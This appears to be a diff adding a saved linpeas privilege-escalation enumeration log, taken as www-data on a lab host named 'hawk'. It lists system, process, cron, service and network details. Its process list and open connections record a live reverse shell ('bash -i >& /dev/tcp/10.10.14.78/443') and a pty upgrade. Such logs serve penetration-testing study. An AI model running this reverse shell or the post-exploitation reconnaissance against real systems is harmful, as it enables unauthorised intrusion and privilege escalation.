@@ -1,0 +1,1888 @@
+www-data@hawk /tmp $ ./linpeas.sh -a
+ Starting linpeas. Building blacklists...
+
+                     ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+             ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄▄
+      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄
+  ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄
+  ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
+  ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
+  ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
+  ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
+  ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
+  ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
+  ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
+  ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
+  ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
+  ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
+   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
+  ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+   ▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄
+        ▄▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄ 
+             ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+    linpeas v2.7.9 by carlospolop
+
+ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.
+
+Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
+ LEGEND:
+  RED/YELLOW: 99% a PE vector
+  RED: You must take a look at it
+  LightCyan: Users with console
+  Blue: Users without console & mounted devs
+  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
+  LightMangeta: Your username
+
+
+====================================( Basic information )=====================================
+OS: Linux version 4.15.0-23-generic (buildd@lgw01-amd64-055) (gcc version 7.3.0 (Ubuntu 7.3.0-16ubuntu3)) #25-Ubuntu SMP Wed May 23 18:02:16 UTC 2018
+User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+Hostname: hawk
+Writable folder: /dev/shm
+[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
+[+] /bin/nc is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)
+
+
+Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE
+====================================( System Information )====================================
+[+] Operative system
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits
+Linux version 4.15.0-23-generic (buildd@lgw01-amd64-055) (gcc version 7.3.0 (Ubuntu 7.3.0-16ubuntu3)) #25-Ubuntu SMP Wed May 23 18:02:16 UTC 2018
+Distributor ID:	Ubuntu
+Description:	Ubuntu 18.04 LTS
+Release:	18.04
+Codename:	bionic
+
+[+] Sudo version
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version
+Sudo version 1.8.21p2
+
+[+] PATH
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+[+] Date
+Fri Oct 23 14:09:28 UTC 2020
+
+[+] System stats
+Filesystem      Size  Used Avail Use% Mounted on
+/dev/sda2       9.8G  5.3G  4.0G  58% /
+udev            452M     0  452M   0% /dev
+tmpfs           482M     0  482M   0% /dev/shm
+tmpfs            97M  1.2M   96M   2% /run
+tmpfs           5.0M     0  5.0M   0% /run/lock
+tmpfs           482M     0  482M   0% /sys/fs/cgroup
+/dev/loop0       87M   87M     0 100% /snap/core/4650
+/dev/loop1       87M   87M     0 100% /snap/core/4830
+/dev/loop2       87M   87M     0 100% /snap/core/4486
+              total        used        free      shared  buff/cache   available
+Mem:         985104      246988      422380        7228      315736      564204
+Swap:       2017276      250880     1766396
+
+[+] CPU info
+Architecture:        x86_64
+CPU op-mode(s):      32-bit, 64-bit
+Byte Order:          Little Endian
+CPU(s):              1
+On-line CPU(s) list: 0
+Thread(s) per core:  1
+Core(s) per socket:  1
+Socket(s):           1
+NUMA node(s):        1
+Vendor ID:           AuthenticAMD
+CPU family:          23
+Model:               49
+Model name:          AMD EPYC 7302P 16-Core Processor
+Stepping:            0
+CPU MHz:             2994.375
+BogoMIPS:            5988.75
+Hypervisor vendor:   VMware
+Virtualization type: full
+L1d cache:           32K
+L1i cache:           32K
+L2 cache:            512K
+L3 cache:            131072K
+NUMA node0 CPU(s):   0
+Flags:               fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx mmxext fxsr_opt pdpe1gb rdtscp lm constant_tsc rep_good nopl tsc_reliable nonstop_tsc cpuid extd_apicid pni pclmulqdq ssse3 fma cx16 sse4_1 sse4_2 x2apic movbe popcnt aes xsave avx f16c rdrand hypervisor lahf_lm extapic cr8_legacy abm sse4a misalignsse 3dnowprefetch osvw ssbd ibpb vmmcall fsgsbase bmi1 avx2 smep bmi2 rdseed adx smap clflushopt clwb xsaveopt xsavec xsaves arat overflow_recov succor
+
+[+] Environment
+[i] Any private information inside environment variables?
+HISTFILESIZE=0
+SHLVL=3
+PS1=\[\e]0;\u@\h: \w\a\]\[\033[01;32m\]\u@\h\[\033[01;34m\] \w \$\[\033[00m\] 
+APACHE_RUN_DIR=/var/run/apache2
+APACHE_PID_FILE=/var/run/apache2/apache2.pid
+JOURNAL_STREAM=9:21454
+_=./linpeas.sh
+TERM=xterm
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+INVOCATION_ID=bf2299b8dd2349c982d61e460b8237af
+APACHE_LOCK_DIR=/var/lock/apache2
+LANG=C
+HISTSIZE=0
+SHELL=bash
+APACHE_RUN_GROUP=www-data
+APACHE_RUN_USER=www-data
+APACHE_LOG_DIR=/var/log/apache2
+HISTFILE=/dev/null
+LS_OPTIONS=--color=auto
+
+[+] Searching Signature verification failed in dmseg
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#dmesg-signature-verification-failed
+ Not Found
+
+[+] AppArmor enabled? .............. You do not have enough privilege to read the profile set.
+apparmor module is loaded.
+[+] grsecurity present? ............ grsecurity Not Found
+[+] PaX bins present? .............. PaX Not Found
+[+] Execshield enabled? ............ Execshield Not Found
+[+] SELinux enabled? ............... sestatus Not Found
+[+] Is ASLR enabled? ............... Yes
+[+] Printer? ....................... lpstat Not Found
+[+] Is this a container? ........... No
+[+] Any running containers? ........ No
+
+
+=========================================( Devices )==========================================
+[+] Any sd*/disk* disk in /dev? (limit 20)
+disk
+sda
+sda1
+sda2
+
+[+] Unmounted file-system?
+[i] Check if you can mount umounted devices
+UUID=427bd106-6d63-11e8-b862-0800275575e5 / ext4 defaults 0 0
+/swap.img	none	swap	sw	0	0
+
+
+====================================( Available Software )====================================
+[+] Useful software
+/bin/nc
+/bin/netcat
+/usr/bin/wget
+/usr/bin/curl
+/bin/ping
+/usr/bin/base64
+/usr/bin/python3
+/usr/bin/python3.6
+/usr/bin/perl
+/usr/bin/php
+/usr/bin/sudo
+
+[+] Installed Compiler
+/snap/core/4486/usr/share/gcc-5
+/snap/core/4650/usr/share/gcc-5
+/usr/share/gcc-8
+
+
+================================( Processes, Cron, Services, Timers & Sockets )================================
+[+] Cleaned processes
+[i] Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
+Debian-+    834  0.0  0.2  63964  2212 ?        Ss   12:47   0:02 /usr/sbin/snmpd -Lsd -Lf /dev/null -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f
+daemon[0m      797  0.0  0.1  28332  1856 ?        Ss   12:47   0:00 /usr/sbin/atd -f
+message+    800  0.0  0.3  50060  3296 ?        Ss   12:47   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+mysql       876  2.5  9.4 1191904 93492 ?       Sl   12:47   2:07 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid
+root          1  0.0  0.5 159564  5796 ?        Ss   12:47   0:02 /sbin/init maybe-ubiquity
+root        414  0.0  0.6  94808  6604 ?        S<s  12:47   0:00 /lib/systemd/systemd-journald
+root        418  0.0  0.3 117524  3532 ?        Ss   12:47   0:04 /usr/bin/vmtoolsd
+root        424  0.0  0.0  97708   932 ?        Ss   12:47   0:00 /sbin/lvmetad -f
+root        440  0.0  0.1  45676  1592 ?        Ss   12:47   0:00 /lib/systemd/systemd-udevd
+root        794  0.0  0.1  87760  1912 ?        Ss   12:47   0:00 /usr/bin/VGAuthService
+root        798  0.0  0.2 169132  2464 ?        Ssl  12:47   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher
+root        804  0.0  0.2 288644  2012 ?        Ssl  12:47   0:00 /usr/lib/accountsservice/accounts-daemon[0m
+root        805  0.0  0.1  61996  1732 ?        Ss   12:47   0:00 /lib/systemd/systemd-logind
+root        809  0.0  0.2  30028  2456 ?        Ss   12:47   0:00 /usr/sbin/cron -f
+root        811  0.0  0.2  57500  2148 ?        S    12:47   0:00 /usr/sbin/CRON -f
+root        813  0.0  0.0   4628   628 ?        Ss   12:47   0:00 /bin/sh -c /usr/bin/java -jar /opt/h2/bin/h2-1.4.196.jar
+root        814  0.1  0.5 2329256 5908 ?        Sl   12:47   0:05 /usr/bin/java -jar /opt/h2/bin/h2-1.4.196.jar
+root        833  0.0  0.1  28676  1284 ?        Ss   12:47   0:00 /usr/sbin/vsftpd /etc/vsftpd.conf
+root        836  0.0  0.2  72296  2504 ?        Ss   12:47   0:00 /usr/sbin/sshd -D
+root        837  0.0  0.0  25376    84 ?        Ss   12:47   0:00 /sbin/iscsid
+root        838  0.0  0.5  25880  5260 ?        S<Ls 12:47   0:00 /sbin/iscsid
+root        888  0.0  0.1  14888  1416 tty1     Ss+  12:47   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
+root        902  0.0  0.6 326720  6448 ?        Ss   12:47   0:01 /usr/sbin/apache2 -k start
+root        905  0.0  0.4 288868  3956 ?        Ssl  12:47   0:00 /usr/lib/policykit-1/polkitd --no-debug
+syslog      799  0.0  0.1 267272  1876 ?        Ssl  12:47   0:00 /usr/sbin/rsyslogd -n
+systemd+    499  0.0  0.2 141908  2308 ?        Ssl  12:47   0:00 /lib/systemd/systemd-timesyncd
+systemd+    679  0.0  0.2  71816  2400 ?        Ss   12:47   0:00 /lib/systemd/systemd-networkd
+systemd+    714  0.0  0.3  70608  3248 ?        Ss   12:47   0:00 /lib/systemd/systemd-resolved
+www-data  11020  0.0  1.8 331988 18236 ?        S    13:40   0:00 /usr/sbin/apache2 -k start
+www-data  11044  0.0  1.8 331988 17784 ?        S    13:40   0:00 /usr/sbin/apache2 -k start
+www-data  11081  0.0  2.0 332344 20556 ?        S    13:44   0:00 /usr/sbin/apache2 -k start
+www-data  11083  0.0  1.9 331988 19412 ?        S    13:44   0:00 /usr/sbin/apache2 -k start
+www-data  11109  0.0  1.8 331980 17984 ?        S    13:44   0:00 /usr/sbin/apache2 -k start
+www-data  11111  0.0  1.9 332052 19284 ?        S    13:44   0:00 /usr/sbin/apache2 -k start
+www-data  11221  0.0  2.2 332356 22344 ?        S    13:44   0:00 /usr/sbin/apache2 -k start
+www-data  11230  0.0  1.8 331980 18440 ?        S    13:44   0:00 /usr/sbin/apache2 -k start
+www-data  11287  0.0  1.7 331980 17304 ?        S    13:44   0:00 /usr/sbin/apache2 -k start
+www-data  11299  0.0  1.8 331980 18192 ?        S    13:44   0:00 /usr/sbin/apache2 -k start
+www-data  11975  0.0  0.0   4628   816 ?        S    14:05   0:00 sh -c bash -c 'bash -i >& /dev/tcp/10.10.14.78/443 0>&1'
+www-data  11976  0.0  0.3  18376  3132 ?        S    14:05   0:00 bash -c bash -i >& /dev/tcp/10.10.14.78/443 0>&1
+www-data  11977  0.0  0.3  18508  3536 ?        S    14:05   0:00 bash -i
+www-data  11983  0.0  0.9  37472  9212 ?        S    14:06   0:00 python3 -c import pty; pty.spawn("/bin/bash")
+www-data  11984  0.0  0.3  18508  3516 pts/0    Ss   14:06   0:00 /bin/bash
+www-data  12097  0.1  0.2   5084  2276 pts/0    S+   14:09   0:00 /bin/sh ./linpeas.sh -a
+www-data  12637  0.0  0.3  36700  3196 pts/0    R+   14:09   0:00 ps aux
+www-data  12639  0.0  0.1  13068  1004 pts/0    S+   14:09   0:00 sort
+
+[+] Binary processes permissions
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
+-rwxr-xr-x 1 root root  1113504 Apr  4  2018 /bin/bash
+lrwxrwxrwx 1 root root        4 Apr 26  2018 /bin/sh -> dash
+-rwxr-xr-x 1 root root   129096 Apr 20  2018 /lib/systemd/systemd-journald
+-rwxr-xr-x 1 root root   219272 Apr 20  2018 /lib/systemd/systemd-logind
+-rwxr-xr-x 1 root root  1616976 Apr 20  2018 /lib/systemd/systemd-networkd
+-rwxr-xr-x 1 root root   378944 Apr 20  2018 /lib/systemd/systemd-resolved
+-rwxr-xr-x 1 root root    38976 Apr 20  2018 /lib/systemd/systemd-timesyncd
+-rwxr-xr-x 1 root root   584136 Apr 20  2018 /lib/systemd/systemd-udevd
+-rwxr-xr-x 1 root root    56552 Mar 15  2018 /sbin/agetty
+lrwxrwxrwx 1 root root       20 Apr 20  2018 /sbin/init -> /lib/systemd/systemd
+-rwxr-xr-x 1 root root   407704 Feb 21  2018 /sbin/iscsid
+-rwxr-xr-x 1 root root    84104 Apr 12  2018 /sbin/lvmetad
+-rwxr-xr-x 1 root root   125144 Apr 19  2018 /usr/bin/VGAuthService
+-rwxr-xr-x 1 root root   236584 Nov 15  2017 /usr/bin/dbus-daemon[0m
+lrwxrwxrwx 1 root root       22 Jun 11  2018 /usr/bin/java -> /etc/alternatives/java
+lrwxrwxrwx 1 root root        9 Apr 10  2018 /usr/bin/python3 -> python3.6
+-rwxr-xr-x 1 root root    47360 Apr 19  2018 /usr/bin/vmtoolsd
+-rwxr-xr-x 1 root root   182552 Dec 18  2017 /usr/lib/accountsservice/accounts-daemon[0m
+-rwxr-xr-x 1 root root    14552 Mar 27  2018 /usr/lib/policykit-1/polkitd
+-rwxr-xr-x 1 root root   671392 Apr 25  2018 /usr/sbin/apache2
+-rwxr-xr-x 1 root root    26632 Feb 20  2018 /usr/sbin/atd
+-rwxr-xr-x 1 root root    47416 Nov 16  2017 /usr/sbin/cron
+-rwxr-xr-x 1 root root 24923432 Apr 24  2018 /usr/sbin/mysqld
+-rwxr-xr-x 1 root root   680488 Apr 24  2018 /usr/sbin/rsyslogd
+-rwxr-xr-x 1 root root    30728 Feb 20  2018 /usr/sbin/snmpd
+-rwxr-xr-x 1 root root   786856 Feb 10  2018 /usr/sbin/sshd
+-rwxr-xr-x 1 root root   168200 Feb  5  2018 /usr/sbin/vsftpd
+
+[+] Processes with credentials in memory (root req)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#credentials-from-process-memory
+gdm-password Not Found
+gnome-keyring-daemon Not Found
+lightdm Not Found
+vsftpd process found (dump creds from memory as root)
+apache2 process found (dump creds from memory as root)
+sshd Not Found
+
+[+] Different processes executed during 1 min (interesting is low number of repetitions)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#frequent-cron-jobs
+
+[+] Cron jobs
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-cron-jobs
+-rw-r--r-- 1 root root  722 Nov 16  2017 /etc/crontab
+
+/etc/cron.d:
+total 24
+drwxr-xr-x   2 root root 4096 Jun 11  2018 .
+drwxr-xr-x 105 root root 4096 Jul 14  2018 ..
+-rw-r--r--   1 root root  102 Nov 16  2017 .placeholder
+-rw-r--r--   1 root root  589 Mar  7  2018 mdadm
+-rw-r--r--   1 root root  712 Jan 17  2018 php
+-rw-r--r--   1 root root  189 Apr 26  2018 popularity-contest
+
+/etc/cron.daily:
+total 64
+drwxr-xr-x   2 root root 4096 Jun 11  2018 .
+drwxr-xr-x 105 root root 4096 Jul 14  2018 ..
+-rw-r--r--   1 root root  102 Nov 16  2017 .placeholder
+-rwxr-xr-x   1 root root  539 Oct 23  2017 apache2
+-rwxr-xr-x   1 root root  376 Nov 20  2017 apport
+-rwxr-xr-x   1 root root 1478 Apr 20  2018 apt-compat
+-rwxr-xr-x   1 root root  355 Dec 29  2017 bsdmainutils
+-rwxr-xr-x   1 root root 1176 Nov  2  2017 dpkg
+-rwxr-xr-x   1 root root  372 Aug 21  2017 logrotate
+-rwxr-xr-x   1 root root 1065 Apr  7  2018 man-db
+-rwxr-xr-x   1 root root  539 Mar  7  2018 mdadm
+-rwxr-xr-x   1 root root  538 Mar  1  2018 mlocate
+-rwxr-xr-x   1 root root  249 Jan 25  2018 passwd
+-rwxr-xr-x   1 root root 3477 Feb 21  2018 popularity-contest
+-rwxr-xr-x   1 root root  246 Mar 21  2018 ubuntu-advantage-tools
+-rwxr-xr-x   1 root root  214 Jul 12  2013 update-notifier-common
+
+/etc/cron.hourly:
+total 12
+drwxr-xr-x   2 root root 4096 Apr 26  2018 .
+drwxr-xr-x 105 root root 4096 Jul 14  2018 ..
+-rw-r--r--   1 root root  102 Nov 16  2017 .placeholder
+
+/etc/cron.monthly:
+total 12
+drwxr-xr-x   2 root root 4096 Apr 26  2018 .
+drwxr-xr-x 105 root root 4096 Jul 14  2018 ..
+-rw-r--r--   1 root root  102 Nov 16  2017 .placeholder
+
+/etc/cron.weekly:
+total 20
+drwxr-xr-x   2 root root 4096 Apr 26  2018 .
+drwxr-xr-x 105 root root 4096 Jul 14  2018 ..
+-rw-r--r--   1 root root  102 Nov 16  2017 .placeholder
+-rwxr-xr-x   1 root root  723 Apr  7  2018 man-db
+-rwxr-xr-x   1 root root  211 Jul 12  2013 update-notifier-common
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+
+[+] Services
+[i] Search for outdated versions
+ [ - ]  acpid
+ [ + ]  apache-htcacheclean
+ [ + ]  apache2
+ [ - ]  apparmor
+ [ + ]  apport
+ [ + ]  atd
+ [ - ]  console-setup.sh
+ [ + ]  cron
+ [ - ]  cryptdisks
+ [ - ]  cryptdisks-early
+ [ + ]  dbus
+ [ + ]  ebtables
+ [ + ]  grub-common
+ [ - ]  hwclock.sh
+ [ - ]  irqbalance
+ [ + ]  iscsid
+ [ - ]  keyboard-setup.sh
+ [ + ]  kmod
+ [ - ]  lvm2
+ [ + ]  lvm2-lvmetad
+ [ + ]  lvm2-lvmpolld
+ [ - ]  lxcfs
+ [ - ]  lxd
+ [ - ]  mdadm
+ [ - ]  mdadm-waitidle
+ [ + ]  mysql
+ [ + ]  networking
+ [ - ]  open-iscsi
+ [ + ]  open-vm-tools
+ [ - ]  plymouth
+ [ - ]  plymouth-log
+ [ + ]  procps
+ [ - ]  rsync
+ [ + ]  rsyslog
+ [ - ]  screen-cleanup
+ [ + ]  snmpd
+ [ + ]  ssh
+ [ + ]  udev
+ [ + ]  ufw
+ [ + ]  unattended-upgrades
+ [ - ]  uuidd
+ [ + ]  vsftpd
+ [ - ]  x11-common
+
+[+] Systemd PATH
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#systemd-path-relative-paths
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+[+] Analyzing .service files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#services
+/etc/systemd/system/emergency.target.wants/friendly-recovery.service is executing some relative path
+/etc/systemd/system/multi-user.target.wants/networking.service is executing some relative path
+/etc/systemd/system/network-online.target.wants/networking.service is executing some relative path
+/etc/systemd/system/rescue.target.wants/friendly-recovery.service is executing some relative path
+/etc/systemd/system/sysinit.target.wants/friendly-recovery.service is executing some relative path
+/lib/systemd/system/friendly-recovery.service is executing some relative path
+/lib/systemd/system/networking.service is executing some relative path
+/snap/core/4486/etc/systemd/system/multi-user.target.wants/networking.service is executing some relative path
+/snap/core/4486/etc/systemd/system/network-online.target.wants/networking.service is executing some relative path
+/snap/core/4486/lib/systemd/system/emergency.service is executing some relative path
+/snap/core/4486/lib/systemd/system/networking.service is executing some relative path
+/snap/core/4486/lib/systemd/system/rescue.service is executing some relative path
+/snap/core/4650/etc/systemd/system/multi-user.target.wants/networking.service is executing some relative path
+/snap/core/4650/etc/systemd/system/network-online.target.wants/networking.service is executing some relative path
+/snap/core/4650/lib/systemd/system/emergency.service is executing some relative path
+/snap/core/4650/lib/systemd/system/networking.service is executing some relative path
+/snap/core/4650/lib/systemd/system/rescue.service is executing some relative path
+/snap/core/4830/etc/systemd/system/multi-user.target.wants/networking.service is executing some relative path
+/snap/core/4830/etc/systemd/system/network-online.target.wants/networking.service is executing some relative path
+/snap/core/4830/lib/systemd/system/emergency.service is executing some relative path
+/snap/core/4830/lib/systemd/system/networking.service is executing some relative path
+/snap/core/4830/lib/systemd/system/rescue.service is executing some relative path
+You can't write on systemd PATH
+
+[+] System timers
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers
+NEXT                         LEFT        LAST                         PASSED       UNIT                         ACTIVATES
+Fri 2020-10-23 14:39:00 UTC  28min left  Fri 2020-10-23 14:09:00 UTC  1min 46s ago phpsessionclean.timer        phpsessionclean.service
+Sat 2020-10-24 00:51:50 UTC  10h left    Fri 2020-10-23 12:49:19 UTC  1h 21min ago motd-news.timer              motd-news.service
+Sat 2020-10-24 01:59:38 UTC  11h left    Fri 2020-10-23 12:47:20 UTC  1h 23min ago apt-daily.timer              apt-daily.service
+Sat 2020-10-24 06:47:14 UTC  16h left    Fri 2020-10-23 12:47:20 UTC  1h 23min ago apt-daily-upgrade.timer      apt-daily-upgrade.service
+Sat 2020-10-24 13:02:26 UTC  22h left    Fri 2020-10-23 13:02:26 UTC  1h 8min ago  systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
+Mon 2020-10-26 00:00:00 UTC  2 days left Fri 2020-10-23 12:47:20 UTC  1h 23min ago fstrim.timer                 fstrim.service
+n/a                          n/a         n/a                          n/a          snapd.snap-repair.timer     
+n/a                          n/a         n/a                          n/a          ureadahead-stop.timer        ureadahead-stop.service
+
+[+] Analyzing .timer files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers
+/etc/systemd/system/snapd.snap-repair.timer
+
+[+] Analyzing .socket files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets
+
+[+] HTTP sockets
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets
+
+[+] D-Bus config files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus
+Possible weak user policy found on /etc/dbus-1/system.d/dnsmasq.conf (        <policy user="dnsmasq">)
+Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.thermald.conf (        <policy group="power">)
+
+[+] D-Bus Service Objects list
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus
+NAME                                 PID PROCESS         USER             CONNECTION    UNIT                      SESSION    DESCRIPTION        
+:1.0                                 679 systemd-network systemd-network  :1.0          systemd-networkd.service  -          -                  
+:1.1                                 714 systemd-resolve systemd-resolve  :1.1          systemd-resolved.service  -          -                  
+:1.2                                   1 systemd         root             :1.2          init.scope                -          -                  
+:1.268                             31950 busctl          www-data         :1.268        apache2.service           -          -                  
+:1.4                                 804 accounts-daemon root             :1.4          accounts-daemon.service   -          -                  
+:1.47                                905 polkitd         root             :1.47         polkit.service            -          -                  
+:1.48                                798 networkd-dispat root             :1.48         networkd-dispatcher.se…ce -          -                  
+:1.6                                 805 systemd-logind  root             :1.6          systemd-logind.service    -          -                  
+com.ubuntu.LanguageSelector            - -               -                (activatable) -                         -         
+com.ubuntu.SoftwareProperties          - -               -                (activatable) -                         -         
+org.freedesktop.Accounts             804 accounts-daemon root             :1.4          accounts-daemon.service   -          -                  
+org.freedesktop.DBus                   1 systemd         root             -             init.scope                -          -                  
+org.freedesktop.PolicyKit1           905 polkitd         root             :1.47         polkit.service            -          -                  
+org.freedesktop.hostname1              - -               -                (activatable) -                         -         
+org.freedesktop.locale1                - -               -                (activatable) -                         -         
+org.freedesktop.login1               805 systemd-logind  root             :1.6          systemd-logind.service    -          -                  
+org.freedesktop.network1             679 systemd-network systemd-network  :1.0          systemd-networkd.service  -          -                  
+org.freedesktop.resolve1             714 systemd-resolve systemd-resolve  :1.1          systemd-resolved.service  -          -                  
+org.freedesktop.systemd1               1 systemd         root             :1.2          init.scope                -          -                  
+org.freedesktop.thermald               - -               -                (activatable) -                         -         
+org.freedesktop.timedate1              - -               -                (activatable) -                         -         
+
+
+===================================( Network Information )====================================
+[+] Hostname, hosts and DNS
+hawk
+127.0.0.1	localhost.localdomain	localhost
+::1		localhost6.localdomain6	localhost6
+
+::1     localhost ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+ff02::3 ip6-allhosts
+
+nameserver 127.0.0.53
+
+[+] Content of /etc/inetd.conf & /etc/xinetd.conf
+/etc/inetd.conf Not Found
+
+[+] Interfaces
+# symbolic names for networks, see networks(5) for more information
+link-local 169.254.0.0
+ens33: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.10.10.102  netmask 255.255.255.0  broadcast 10.10.10.255
+        inet6 fe80::250:56ff:feb9:9d2c  prefixlen 64  scopeid 0x20<link>
+        inet6 dead:beef::250:56ff:feb9:9d2c  prefixlen 64  scopeid 0x0<global>
+        ether 00:50:56:b9:9d:2c  txqueuelen 1000  (Ethernet)
+        RX packets 111919  bytes 14819824 (14.8 MB)
+        RX errors 0  dropped 23  overruns 0  frame 0
+        TX packets 155123  bytes 126962836 (126.9 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 20452  bytes 1512075 (1.5 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 20452  bytes 1512075 (1.5 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+
+[+] Networks and neighbours
+Kernel IP routing table
+Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
+default         _gateway        0.0.0.0         UG    0      0        0 ens33
+10.10.10.0      0.0.0.0         255.255.255.0   U     0      0        0 ens33
+Address                  HWtype  HWaddress           Flags Mask            Iface
+_gateway                 ether   00:50:56:b9:83:d8   C                     ens33
+
+[+] Iptables rules
+iptables rules Not Found
+
+[+] Active Ports
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0    169 10.10.10.102:52610      10.10.14.78:443         ESTABLISHED 11977/bash          
+tcp6       0      0 :::9092                 :::*                    LISTEN      -                   
+tcp6       0      0 :::80                   :::*                    LISTEN      -                   
+tcp6       0      0 :::8082                 :::*                    LISTEN      -                   
+tcp6       0      0 :::21                   :::*                    LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+tcp6       0      0 :::5435                 :::*                    LISTEN      -                   
